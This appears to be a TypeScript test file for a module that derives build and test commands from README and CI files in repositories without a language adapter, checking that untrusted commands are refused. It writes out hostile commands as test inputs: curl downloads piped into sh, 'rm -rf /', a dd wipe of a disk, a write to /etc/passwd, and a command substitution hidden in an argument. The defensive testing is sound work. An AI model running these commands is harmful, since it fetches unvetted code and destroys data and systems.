/**
 * Tests for generic runtime discovery.
 *
 * §62 calls this the strongest proof of universality, and the fixture here is a Nim
 * repository: a language with no adapter, no marker table entry and no mention anywhere in
 * the codebase. If the system can build that, the architecture is open rather than wide.
 *
 * The other half of these tests is about refusing. Discovery reads commands out of README
 * files and CI configuration, which is untrusted content, and a discovery layer that will
 * run anything it finds is a worse problem than one that supports fewer languages.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import type { ProjectFile } from '../../ai/patches.js';
import {
  candidateFromLine,
  deriveRuntimeCapability,
  describeCapability,
  synthesizeAdapter,
  validateRuntimeCapability,
  type CommandRun,
  type RuntimeCapabilitySpec,
} from './runtimeDiscovery.js';
import { detectComposition, registerRuntimeAdapter, setRuntimeAdaptersForTesting, runtimeAdapters } from './registry.js';

const f = (path: string, content = ''): ProjectFile => ({ path, content });

/** A Nim project: no adapter, no marker, and a CI workflow that states the truth. */
const nim: ProjectFile[] = [
  f('src/converter.nim', 'echo "hello"'),
  f('tests/test_converter.nim', 'assert true'),
  f('converter.nimble', 'version = "0.1.0"'),
  f('README.md', '## Build\n\n```sh\nnimble build\n```\n'),
  f('.github/workflows/ci.yml', 'jobs:\n  ci:\n    steps:\n      - run: nimble install -y\n      - run: nimble test\n'),
];

const ok = (): CommandRun => ({ exitCode: 0, stdout: '', stderr: '' });

describe('a language nobody wrote an adapter for', () => {
  it('derives install, build and test commands for a Nim repository', () => {
    const spec = deriveRuntimeCapability(nim)!;
    assert.ok(spec, 'discovery should engage for an unrecognised toolchain');
    assert.equal(`${spec.install?.command} ${spec.install?.args.join(' ')}`, 'nimble install -y');
    assert.equal(`${spec.test?.command} ${spec.test?.args.join(' ')}`, 'nimble test');
    assert.equal(`${spec.build?.command} ${spec.build?.args.join(' ')}`, 'nimble build');
  });

  it('prefers the CI workflow over the README for the same phase', () => {
    // CI is executable, maintained and runs on every push. A README fence is prose that
    // nothing verifies, and it is stale about as often as it is right.
    const spec = deriveRuntimeCapability([
      f('src/a.nim', ''),
      f('README.md', '```sh\nnimble build --old-flag\n```'),
      f('.github/workflows/ci.yml', 'steps:\n  - run: nimble build --release\n'),
    ])!;
    assert.equal(spec.build?.rank, 'ci_workflow');
    assert.ok(spec.build?.args.includes('--release'));
  });

  it('falls back through container and Makefile evidence when there is no CI', () => {
    const fromMake = deriveRuntimeCapability([
      f('src/a.hs', ''),
      f('Makefile', 'build:\n\tstack build\n\ntest:\n\tstack test\n'),
    ])!;
    assert.equal(fromMake.build?.rank, 'make_target');
    assert.equal(`${fromMake.build?.command} ${fromMake.build?.args.join(' ')}`, 'make build');

    const fromDocker = deriveRuntimeCapability([
      f('src/a.cr', ''),
      f('Dockerfile', 'FROM alpine\nRUN shards install\nRUN crystal spec\n'),
    ])!;
    assert.equal(fromDocker.install?.rank, 'container');
  });

  it('names the ecosystem from a recognised marker rather than saying unknown', () => {
    // mix.exs is recognised by the marker table but has no adapter. Saying "Elixir" is
    // strictly more useful than "unknown toolchain" when the file is sitting right there.
    const spec = deriveRuntimeCapability([
      f('mix.exs', 'defmodule App.MixProject do\nend'),
      f('lib/app.ex', ''),
      f('.github/workflows/ci.yml', 'steps:\n  - run: mix test\n'),
    ])!;
    assert.equal(spec.ecosystem, 'elixir');
    assert.match(spec.displayName, /Elixir/);
  });

  it('does not engage when an adapter already covers the repository', () => {
    assert.equal(deriveRuntimeCapability([f('Cargo.toml', '[package]\nname="a"\n'), f('src/main.rs', '')]), null);
  });

  it('reports honestly when no command can be found at all', () => {
    const spec = deriveRuntimeCapability([f('src/a.nim', 'echo 1'), f('src/b.nim', '')])!;
    assert.equal(spec.candidates.length, 0);
    assert.equal(spec.confidence, 0);
    assert.match(describeCapability(spec), /no build or test command could be found/);
  });
});

describe('discovered commands are refused before they are run', () => {
  // A README is content authored by whoever opened the pull request. The sandbox is the
  // real boundary, but a discovery layer that runs anything it reads is a worse problem
  // than one that supports fewer languages.
  it('refuses a download piped into a shell', () => {
    const result = candidateFromLine('curl -sSf https://example.com/i.sh | sh', 'documentation', 'README.md');
    assert.ok('rejected' in result);
    assert.match(result.rejected.reason, /pipes a download straight into a shell/);
  });

  it('refuses privilege escalation, destructive commands and remote writes', () => {
    const cases: ReadonlyArray<[string, RegExp]> = [
      ['sudo apt-get install nim', /privilege escalation/],
      ['rm -rf /', /deletion/],
      ['git push origin main', /remote repository/],
      ['dd if=/dev/zero of=/dev/sda', /destructive/],
      ['echo x > /etc/passwd', /outside the workspace/],
    ];
    for (const [line, expected] of cases) {
      const result = candidateFromLine(line, 'documentation', 'README.md');
      assert.ok('rejected' in result, `${line} must be refused`);
      assert.match(result.rejected.reason, expected);
    }
  });

  it('refuses anything needing a shell rather than approximating it', () => {
    // A ToolCommand is argv with no shell. Passing `a && b` through as text would make
    // "&&" an argument; splitting on it would invent a command nobody wrote.
    for (const line of ['make build && make test', 'cat f | grep x', 'run > out.txt']) {
      const result = candidateFromLine(line, 'ci_workflow', 'ci.yml');
      assert.ok('rejected' in result, `${line} must be refused`);
    }
  });

  it('refuses command substitution even inside an otherwise plausible command', () => {
    const result = candidateFromLine('nimble build --version=$(cat VERSION)', 'ci_workflow', 'ci.yml');
    assert.ok('rejected' in result);
    assert.match(result.rejected.reason, /command substitution/);
  });

  it('skips shell context that is not a build step', () => {
    for (const line of ['cd src', 'export CC=gcc', 'source .env']) {
      const result = candidateFromLine(line, 'ci_workflow', 'ci.yml');
      assert.ok('rejected' in result);
      assert.match(result.rejected.reason, /shell context/);
    }
  });

  it('keeps quoted arguments intact', () => {
    const result = candidateFromLine('nimble test --opt "a b"', 'ci_workflow', 'ci.yml');
    assert.ok('candidate' in result);
    assert.deepEqual(result.candidate.args, ['test', '--opt', 'a b']);
  });

  it('records refusals in the spec instead of dropping them silently', () => {
    // An operator needs to know a command was found and refused; silence looks like the
    // command was never there.
    const spec = deriveRuntimeCapability([
      f('src/a.nim', ''),
      f('README.md', '```sh\ncurl https://x.sh | sh\nnimble test\n```'),
    ])!;
    assert.equal(spec.rejected.length, 1);
    assert.match(describeCapability(spec), /refused/);
  });
});

describe('nothing is trusted until it runs', () => {
  it('marks a freshly derived spec as unvalidated', () => {
    assert.equal(deriveRuntimeCapability(nim)!.validated, false);
  });

  it('refuses to synthesise an adapter from an unvalidated spec', () => {
    // A registered adapter is consulted by the planner as an equal to the written ones.
    // Admitting an unproven one would put a README guess on the same footing as Cargo.
    const spec = deriveRuntimeCapability(nim)!;
    assert.throws(() => synthesizeAdapter(spec), /have not been validated/);
  });

  it('validates when the derived commands actually succeed', async () => {
    const outcome = await validateRuntimeCapability(deriveRuntimeCapability(nim)!, async () => ok());
    assert.equal(outcome.blocker, null);
    assert.equal(outcome.spec.validated, true);
    assert.deepEqual(outcome.ran.map((entry) => entry.phase), ['install', 'build', 'test']);
  });

  it('reports a missing toolchain differently from a failing test', async () => {
    // They need different responses: one is a sandbox image gap that no code change can
    // fix, the other is a genuine repository failure.
    const missing = await validateRuntimeCapability(deriveRuntimeCapability(nim)!, async () => ({
      exitCode: 127, stdout: '', stderr: 'nimble: command not found',
    }));
    assert.match(missing.blocker!, /not installed in the sandbox image/);
    assert.match(missing.blocker!, /No source change can fix this/);
    assert.equal(missing.spec.validated, false);

    const failing = await validateRuntimeCapability(deriveRuntimeCapability(nim)!, async (command) =>
      command.args.includes('test') ? { exitCode: 1, stdout: '', stderr: '1 test failed' } : ok(),
    );
    assert.match(failing.blocker!, /exited 1/);
    assert.match(failing.blocker!, /did not succeed/);
    assert.equal(failing.spec.validated, false);
  });

  it('tolerates an install failure but not a test failure', async () => {
    // A registry can be unreachable under a denied-egress policy without the toolchain
    // being wrong. A failing test is decisive.
    const outcome = await validateRuntimeCapability(deriveRuntimeCapability(nim)!, async (command) =>
      command.networkPolicy === 'registry-only'
        ? { exitCode: 1, stdout: '', stderr: 'network unreachable' }
        : ok(),
    );
    assert.equal(outcome.blocker, null);
    assert.equal(outcome.spec.validated, true);
  });

  it('blocks when no decisive command could be derived', async () => {
    const empty: RuntimeCapabilitySpec = {
      ecosystem: 'x', displayName: 'X', languages: [], candidates: [],
      install: null, test: null, build: null, evidence: [], rejected: [],
      validated: false, confidence: 0,
    };
    const outcome = await validateRuntimeCapability(empty, async () => {
      throw new Error('must not run anything');
    });
    assert.match(outcome.blocker!, /No test or build command could be derived/);
    assert.match(outcome.blocker!, /Nothing was executed/);
  });

  it('runs only the network for install and denies it everywhere else', async () => {
    const policies: string[] = [];
    await validateRuntimeCapability(deriveRuntimeCapability(nim)!, async (command) => {
      policies.push(`${command.args.join(' ')}=${command.networkPolicy}`);
      return ok();
    });
    assert.ok(policies.some((entry) => entry.startsWith('install') && entry.endsWith('registry-only')));
    assert.ok(policies.filter((entry) => !entry.startsWith('install')).every((entry) => entry.endsWith('none')));
  });
});

describe('a validated spec becomes a usable adapter', () => {
  it('registers and answers the same contract as a written adapter', async () => {
    const original = [...runtimeAdapters()];
    try {
      const outcome = await validateRuntimeCapability(deriveRuntimeCapability(nim)!, async () => ok());
      const adapter = synthesizeAdapter(outcome.spec);

      assert.equal(adapter.capabilityState, 'fixture_verified');
      assert.match(adapter.id, /^discovered:/);

      registerRuntimeAdapter(adapter);
      const composition = detectComposition(nim);
      assert.equal(composition.components[0]?.adapterId, adapter.id);
    } finally {
      setRuntimeAdaptersForTesting(original);
    }
  });

  it('never outranks a written adapter', async () => {
    // A discovered adapter reports confidence 0.5 against a manifest-backed adapter's 1,
    // so a real Cargo project keeps the real Cargo adapter even if a discovered one is
    // registered alongside it.
    const original = [...runtimeAdapters()];
    try {
      const outcome = await validateRuntimeCapability(deriveRuntimeCapability(nim)!, async () => ok());
      registerRuntimeAdapter(synthesizeAdapter(outcome.spec));

      const rust = detectComposition([f('Cargo.toml', '[package]\nname="a"\n'), f('src/main.rs', '')]);
      assert.equal(rust.components[0].adapterId, 'rust');
    } finally {
      setRuntimeAdaptersForTesting(original);
    }
  });

  it('claims fixture_verified rather than production_observed', async () => {
    // The commands ran once, on one repository. That is real evidence and it is not a
    // track record, and the capability states exist to keep those apart.
    const outcome = await validateRuntimeCapability(deriveRuntimeCapability(nim)!, async () => ok());
    assert.equal(synthesizeAdapter(outcome.spec).capabilityState, 'fixture_verified');
  });

  it('does not pretend to structured diagnostics it does not have', async () => {
    const outcome = await validateRuntimeCapability(deriveRuntimeCapability(nim)!, async () => ok());
    const adapter = synthesizeAdapter(outcome.spec);
    const [diagnostic] = adapter.parseFailure('some Nim compiler output nobody has modelled');
    assert.equal(diagnostic.kind, 'unknown');
    assert.equal(diagnostic.repairable, false);
  });
});
